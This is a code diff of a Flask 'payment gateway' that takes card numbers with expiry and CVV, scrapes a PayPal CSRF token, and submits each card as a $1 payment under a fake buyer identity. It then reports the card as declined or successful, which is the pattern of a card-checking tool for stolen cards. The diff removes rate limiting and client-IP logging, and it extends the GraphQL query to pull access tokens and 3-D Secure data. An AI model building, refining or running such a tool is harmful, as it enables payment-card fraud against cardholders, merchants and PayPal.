@@ -3,8 +3,7 @@ import json
 import logging
 import re
 import time
-from flask import Flask, jsonify, request
-from collections import defaultdict
+from flask import Flask, jsonify
 
 # Configure logging
 logging.basicConfig(
@@ -25,16 +24,12 @@ DECLINED_CODES = {
     "VALIDATION_ERROR",
     "LOGIN_ERROR",
     "RISK_DISALLOWED",
-    "TOKEN_EXTRACTION_ERROR",
-    "NETWORK_ERROR",
-    "INTERNAL_ERROR",
-    "INVALID_MONTH",
-    "UNKNOWN_ERROR"
+    "TOKEN_EXTRACTION_ERROR",  # Added
+    "NETWORK_ERROR",           # Added
+    "INTERNAL_ERROR",          # Added
+    "INVALID_MONTH",           # Added
+    "UNKNOWN_ERROR"            # Added
 }
-
-# --- Antispam mechanism ---
-# Dictionary to track last request time for each IP
-last_request_time = defaultdict(float)
 
 def extract_csrf_token(html_content):
     """Extract CSRF token from HTML content with multiple patterns."""
@@ -130,10 +125,10 @@ def process_paypal_payment(card_details_string):
             'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
             'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'x-csrf-token': csrf_token,
+            'x-csrf-token': csrf_token, # Use the dynamically extracted token
         }
         json_data = {
-            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1',
+            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1', # Note: amount is 1 here
             'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
             'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
         }
@@ -172,7 +167,7 @@ def process_paypal_payment(card_details_string):
         logging.error(f"Failed to extract token after {max_acquisition_retries} full acquisition attempts.")
         return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract token from PayPal response after multiple retries.'}
 
-    # --- Request 3: Submit Card Details (Improved Error Handling) ---
+    # --- Request 3: Submit Card Details ---
     headers = {
         'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
         'paypal-client-context': token, 'paypal-client-metadata-id': token,
@@ -181,6 +176,7 @@ def process_paypal_payment(card_details_string):
         'x-app-name': 'standardcardfields', 'x-country': 'US',
     }
 
+    # --- FIX: The complete, correctly formatted GraphQL query ---
     graphql_query = """
     mutation payWithCard(
         $token: String!
@@ -218,6 +214,25 @@ def process_paypal_payment(card_details_string):
             cart {
                 intent
                 cartId
+                buyer {
+                    userId
+                    auth {
+                        accessToken
+                    }
+                }
+                returnUrl {
+                    href
+                }
+            }
+            paymentContingencies {
+                threeDomainSecure {
+                    status
+                    method
+                    redirectUrl {
+                        href
+                    }
+                    parameter
+                }
             }
         }
     }
@@ -226,7 +241,7 @@ def process_paypal_payment(card_details_string):
     json_data = {
         'query': graphql_query.strip(),
         'variables': {
-            'token': token, 'card': card_details, 'phoneNumber': '4073320637',
+            'token': token, 'card': card_details, 'phoneNumber': '4073320637', # Note: phone number is different
             'firstName': 'Rockcy', 'lastName': 'og',
             'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
             'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
@@ -236,41 +251,10 @@ def process_paypal_payment(card_details_string):
     
     try:
         response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data, timeout=20)
-
-        # Log the response status and body for debugging BEFORE parsing JSON
-        logging.info(f"PayPal GraphQL Status Code: {response.status_code}")
-        logging.info(f"PayPal GraphQL Response Body (first 500 chars): {response.text[:500]}")
-
-        # This will raise an HTTPError if the status code is 4xx or 5xx
-        response.raise_for_status()
-
-        # If the status code is OK, try to parse JSON
         response_data = response.json()
-
-    except requests.exceptions.HTTPError as e:
-        # This catches errors like 403 Forbidden, 404 Not Found, etc.
-        logging.error(f"PayPal returned an HTTP error: {e}. Status: {e.response.status_code}. Body: {e.response.text[:500]}")
-        return {'code': 'RISK_DISALLOWED', 'message': f'PayPal blocked the request (HTTP {e.response.status_code}). Check logs for details.'}
-    except requests.exceptions.Timeout:
-        # This catches a timeout error specifically
-        logging.error("The request to PayPal's GraphQL endpoint timed out after 20 seconds.")
-        return {'code': 'NETWORK_ERROR', 'message': 'The request to PayPal timed out. Please try again.'}
-    except requests.exceptions.ConnectionError as e:
-        # This catches DNS failures, refused connections, etc.
-        logging.error(f"Failed to connect to PayPal's GraphQL endpoint: {e}")
-        return {'code': 'NETWORK_ERROR', 'message': 'Could not connect to PayPal. Check your network connection or DNS settings.'}
-    except requests.exceptions.SSLError as e:
-        # This catches SSL certificate verification failures
-        logging.error(f"SSL Error when connecting to PayPal: {e}")
-        return {'code': 'NETWORK_ERROR', 'message': 'A secure connection to PayPal could not be established (SSL Error).'}
-    except requests.exceptions.RequestException as e:
-        # A general catch-all for any other request-related issues
-        logging.error(f"An unexpected network error occurred during the final GraphQL request: {e}")
-        return {'code': 'NETWORK_ERROR', 'message': 'An unknown network error occurred while contacting PayPal.'}
-    except ValueError:
-        # This catches JSON decoding errors if the body is not valid JSON
-        logging.error(f"Failed to decode JSON from PayPal. Status: {response.status_code}. Body: {response.text[:500]}")
-        return {'code': 'INTERNAL_ERROR', 'message': 'PayPal returned an invalid response format.'}
+    except (ValueError, requests.exceptions.RequestException) as e:
+        logging.error(f"Final GraphQL request failed: {e}. Response: {response.text}")
+        return {'code': 'INTERNAL_ERROR', 'message': 'Failed to submit payment to PayPal.'}
 
     # --- 3. Parse PayPal Response ---
     result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}
@@ -289,23 +273,9 @@ def payment_gateway(card_details):
     Main endpoint to process a payment.
     URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}
     """
-    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-    
-    # --- Antispam mechanism ---
-    current_time = time.time()
-    if current_time - last_request_time[client_ip] < 3:  # 3 seconds antispam
-        return jsonify({
-            "status": "error",
-            "code": "RATE_LIMIT_EXCEEDED",
-            "message": "Please wait at least 3 seconds between requests."
-        }), 429
-    
-    last_request_time[client_ip] = current_time
-    
     last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
-    logging.info(f"Received payment request for card ending in {last_four} from IP {client_ip}")
+    logging.info(f"Received payment request for card ending in {last_four}")
     
-    # Process payment directly
     result = process_paypal_payment(card_details)
     
     code = result.get('code')
